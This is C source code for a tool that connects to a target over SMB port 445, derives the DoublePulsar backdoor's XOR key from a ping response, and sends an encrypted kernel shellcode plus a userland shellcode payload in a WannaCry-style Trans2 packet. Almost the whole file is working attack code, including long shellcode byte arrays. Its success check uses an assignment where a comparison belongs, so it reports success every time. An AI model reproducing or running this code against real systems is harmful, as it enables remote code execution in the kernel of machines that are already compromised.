#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

//Fixed Trans2 session setup PING packet.  This should work
unsigned char trans2_request[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
unsigned char wannacry_Trans2_Request[] =
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */

unsigned int LE2INT(unsigned char* data)
{
	unsigned int b;
	b = data[3];
	b <<= 8;
	b += data[2];
	b <<= 8;
	b += data[1];
	b <<= 8;
	b += data[0];
	return b;
}

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
		(((sig << 16) | sig & 0xFF00) << 8));
}

void convert_name(char* out, char* name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

int xor_payload(unsigned int xor_key, unsigned char* buf, int size)
{
	int i;
	char __xor_key[5];
	i = 0;
	*&__xor_key[1] = 0;
	*__xor_key = xor_key;
	if (size <= 0)
		return 0;
	do
	{
		*(i + buf) ^= __xor_key[i % 4];
		++i;
	} while (i < size);
	return 0;
}

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	printf("Connecting to %s\n", argv[1]);
	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);
	
	//output windows version to the screen
	printf("Remote OS: ");
	int r;
	for (r = 0; r < 39; r++) {
		printf("%c", recvbuff[44 + r]);
	}
	printf("\n");

	//Generates a new TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char* ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy the treeID from the TreeConnect response
	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	//Update treeID, UserID
	memcpy(trans2_request + 28, (char*)&treeid, 2);
	memcpy(trans2_request + 32, (char*)&userid, 2);
	//might need to update processid

	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
	//will return x51 or 81
	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	unsigned char signature[6];
	unsigned int sig;
	//copy SMB signature from recvbuff to local buffer
	signature[0] = recvbuff[18];
	signature[1] = recvbuff[19];
	signature[2] = recvbuff[20];
	signature[3] = recvbuff[21];
	signature[4] = recvbuff[22];
	signature[5] = '\0';
	//this is for determining architecture
	//recvbuff[22];
	//but unused at this time

	//convert the signature buffer to unsigned integer 
	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
	sig = LE2INT(signature);

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);

	/*
	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm
	Name: kernel
	Length: 1019 bytes

	Requires a userland payload size length to be added at the end
	*/
	unsigned char kernel_shellcode[] =
		"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
		"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
		"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
		"\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52"
		"\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41"
		"\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A"
		"\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00"
		"\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00"
		"\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1"
		"\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48"
		"\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8"
		"\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83"
		"\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59"
		"\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00"
		"\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41"
		"\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83"
		"\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00"
		"\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81"
		"\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41"
		"\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6"
		"\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48"
		"\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39"
		"\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2"
		"\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00"
		"\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2"
		"\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3"
		"\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00"
		"\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10"
		"\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00"
		"\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00"
		"\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7"
		"\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00"
		"\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00"
		"\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00"
		"\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48"
		"\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB"
		"\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48"
		"\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C"
		"\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB"
		"\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41"
		"\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89"
		"\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31"
		"\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41"
		"\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58"
		"\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00"
		"\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89"
		"\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D"
		"\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00"
		"\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20"
		"\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48"
		"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F"
		"\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41"
		"\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A"
		"\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B"
		"\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B"
		"\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88"
		"\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B"
		"\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01"
		"\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41"
		"\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20"
		"\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51"
		"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41"
		"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
		"\x5E\xC3";

	unsigned char shellcode[] =
		"\x31\xdb\xb3\x30\x29\xdc\x64\x8b\x03\x8b\x40\x0c\x8b"
		"\x58\x1c\x8b\x1b\x8b\x1b\x8b\x73\x08\x89\xf7\x89\x3c"
		"\x24\x8b\x47\x3c\x01\xc7\x31\xdb\xb3\x78\x01\xdf\x8b"
		"\x3f\x8b\x04\x24\x01\xf8\x89\x44\x24\x08\x31\xdb\xb3"
		"\x1c\x01\xc3\x8b\x03\x8b\x3c\x24\x01\xf8\x89\x44\x24"
		"\x0c\x8b\x44\x24\x08\x31\xdb\xb3\x20\x01\xc3\x8b\x03"
		"\x01\xf8\x89\x44\x24\x10\x8b\x44\x24\x08\x31\xdb\xb3"
		"\x24\x01\xc3\x8b\x03\x01\xf8\x89\x44\x24\x14\x8b\x44"
		"\x24\x08\x31\xdb\xb3\x18\x01\xc3\x8b\x03\x89\x44\x24"
		"\x18\x8b\x74\x24\x30\x31\xf6\x89\x74\x24\x30\x8b\x4c"
		"\x24\x18\x8b\x2c\x24\x8b\x5c\x24\x10\x8b\x4c\x24\x18"
		"\x85\xc9\x74\x5f\x49\x89\x4c\x24\x18\x8b\x34\x8b\x01"
		"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf"
		"\x0d\x01\xc7\xeb\xf4\x8b\x5c\x24\x14\x66\x8b\x0c\x4b"
		"\x8b\x5c\x24\x0c\x8b\x04\x8b\x01\xe8\x8b\x34\x24\x81"
		"\xff\xaa\xfc\x0d\x7c\x75\x08\x8d\x74\x24\x20\x89\x06"
		"\xeb\xb5\x81\xff\x8e\x4e\x0e\xec\x75\x08\x8d\x74\x24"
		"\x24\x89\x06\xeb\xa5\x81\xff\x7e\xd8\xe2\x73\x75\x9d"
		"\x8d\x74\x24\x1c\x89\x06\xeb\x95\x89\xe6\x31\xd2\x66"
		"\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x75\x73\x65"
		"\x72\x54\xff\x56\x24\x89\x46\x28\x31\xd2\xb2\x41\x52"
		"\x31\xd2\x66\xba\x6f\x78\x66\x52\x68\x61\x67\x65\x42"
		"\x68\x4d\x65\x73\x73\x54\x50\xff\x56\x20\x89\x46\x2c"
		"\x31\xd2\xb2\x20\x52\x31\xd2\x66\xba\x74\x6f\x66\x52"
		"\x68\x69\x79\x61\x6e\x68\x46\x65\x62\x72\x89\xe3\x31"
		"\xd2\xb2\x6f\x52\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2"
		"\xb2\x04\x52\x31\xd2\x51\x53\x31\xff\x57\xff\x56\x2c"
		"\x89\xf4\x57\xff\x54\x24\x20";

	//might need to make this static due to sizeof being garbage @ counting shellcode
	unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
	unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);

	//remove the NULL terminator count
	kernel_shellcode_size -= 1;
	payload_shellcode_size -= 1;

	//add +2 to the entire shellcode size because the size of the shellcode MUST be appended to the total length
	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;

	//generate the SESSION_SETUP parameters here
	unsigned int TotalSizeOfPayload = EntireShellcodeSize; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
	unsigned int ChunkSize = EntireShellcodeSize; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
	unsigned int OffsetofChunkinPayload = 0x0000;
	unsigned char Parametersbuffer[13];
	memset(Parametersbuffer, 0x00, 12);
	memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
	memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
	memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
	hexDump(NULL, Parametersbuffer, 12);

	unsigned char byte_xor_key[5];
	byte_xor_key[0] = (unsigned char)XorKey;
	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);

	int i;
	for (i = 0; i < 13; i++)
	{
		Parametersbuffer[i] ^= byte_xor_key[i % 4];
	}
	hexDump(NULL, Parametersbuffer, 12);

	//allocate memory for encrypted shellcode payload buffer
	unsigned char *encrypted = (unsigned char*)malloc(EntireShellcodeSize);

	//initialize to 0
	memset((unsigned char*)encrypted, 0x00, EntireShellcodeSize);

	//calculate the payload shellcode length
	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);

	//remove the NULL terminator from the shellcode count
	dwPayloadShellcodeSize -= 1;

	//copy kernel shellcode to encrypted buffer
	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);

	hexDump(NULL, encrypted, kernel_shellcode_size);

	//copy the shellcode size after the kernel shellcode
	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);

	hexDump(NULL, encrypted, kernel_shellcode_size + 2);

	//copy payload shellcode to encrypted buffer
	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);

	hexDump(NULL, encrypted, kernel_shellcode_size + 2 + payload_shellcode_size);

	for (i = 0; i < kernel_shellcode_size + 2 + payload_shellcode_size; i++)
	{
		encrypted[i] ^= byte_xor_key[i % 4];
	}
	//hexDump(NULL, encrypted, EntireShellcodeSize);
	//xor_payload(XorKey, (unsigned char*)encrypted, 4096);

	//allocate memory for the big packet
	unsigned char* big_packet = (unsigned char*)malloc(EntireShellcodeSize + 12 + 70);
	memset((unsigned char*)big_packet, 0x00, EntireShellcodeSize + 12 + 70);

	//copy wannacry skeleton packet to big Trans2 packet
	memcpy((unsigned char*)big_packet, (unsigned char*)wannacry_Trans2_Request, 70);

	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
	memcpy((unsigned char*)big_packet + 70, (unsigned char*)Parametersbuffer, 12);

	//copy encrypted payload
	memcpy((unsigned char*)big_packet + 82, (unsigned char*)encrypted, EntireShellcodeSize);

	//Update treeID, UserID
	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);

	//patch other values
	unsigned short TotalDataCount = EntireShellcodeSize;
	unsigned short DataCount = EntireShellcodeSize;
	unsigned short byteCount = EntireShellcodeSize + 13;

	*(WORD*)(big_packet + 0x27) = TotalDataCount;
	*(WORD*)(big_packet + 0x3b) = DataCount;
	*(WORD*)(big_packet + 0x43) = byteCount;

	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);


	//patch SMB length
	unsigned short smb_length = EntireShellcodeSize + 12 + 70 - 4;
	printf("NetBIOS value of the SMB Length:  %hu\n", smb_length);

	unsigned short smb_htons_len = htons(EntireShellcodeSize + 12 + 70 - 4);
	memcpy((unsigned char*)big_packet + 2, (char*)&smb_htons_len, 2);

	int size_big_packet = EntireShellcodeSize + 82;
	printf("TOTAL Size of packet = %d\nThis value is +4 the NetBIOS value length\n", size_big_packet);

	//hexDump(NULL, big_packet, EntireShellcodeSize + 12 + 70);

	unsigned char *pExeBuffer = (unsigned char*)malloc(size_big_packet);
	//PBYTE pExeBuffer = new BYTE[size_big_packet];
	memcpy(pExeBuffer, big_packet, size_big_packet);
	//pExeBuffer[size_big_packet] = '\0';
	//hexDump(NULL, pExeBuffer, EntireShellcodeSize + 12 + 70);
	//delete pExeBuffer;

	//send the payload
	send(sock, (char*)pExeBuffer, size_big_packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	if(recvbuff[34] = 0x52)
	{
		printf("Doublepulsar returned 82!\n");
	}
	else {
		printf("Doublepulsar didn't work!\n");
	}

	free(pExeBuffer);

	/* for future use

	//update key values in the packet
	unsigned short smb_length = 4096+70+12;
	printf("SMB Length:  %hu\n", smb_length);
	memcpy((unsigned char*)big_packet + 2, (char*)&smb_length, 2);

	//maybe uint16_t ??
	unsigned short TotalDataCount = 4096;
	unsigned short DataCount = 4096;
	unsigned short byteCount = 4096 + 13;

	*(WORD*)(big_packet + 0x27) = TotalDataCount;
	*(WORD*)(big_packet + 0x3b) = DataCount;
	*(WORD*)(big_packet + 0x43) = byteCount;

	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);

	*/

	free(encrypted);
	free(big_packet);


	unsigned char disconnect_packet[] = 
		"\x00\x00\x00\x23\xff\x53\x4d\x42"
		"\x71\x00\x00\x00\x00\x18\x07\xc0"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x08\xff\xfe"
		"\x00\x08\x41\x00\x00\x00\x00";

	//Update treeID, UserID
	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);

	//send the disconnect packet
	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);


	unsigned char logoff_packet[] = 
		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";

	//Update treeID, UserID
	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);

	//send the logoff packet
	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	closesocket(sock);
	WSACleanup();
	return 0;
}
